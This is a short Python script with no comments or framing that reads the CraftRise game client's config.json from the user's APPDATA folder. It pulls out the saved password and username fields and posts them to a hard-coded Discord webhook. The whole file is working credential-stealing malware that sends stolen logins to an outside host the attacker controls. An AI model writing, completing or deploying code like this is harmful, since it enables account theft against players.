import os
import requests
import json

with open(f"{os.getenv('APPDATA')}/.craftrise/config.json") as f:
    data = json.load(f)



url = "https://discord.com/api/webhooks/871350978576805908/FKi5MjzjmsiYnXF_-dmqvS-vx87ODtd1JQLfvKoM9yekHsdAycdjSwm3CSensEcOs_d1"


data2 = {"content":f"{data['rememberPass']}{data['rememberName']}"}
res = requests.post(url,json=data2)
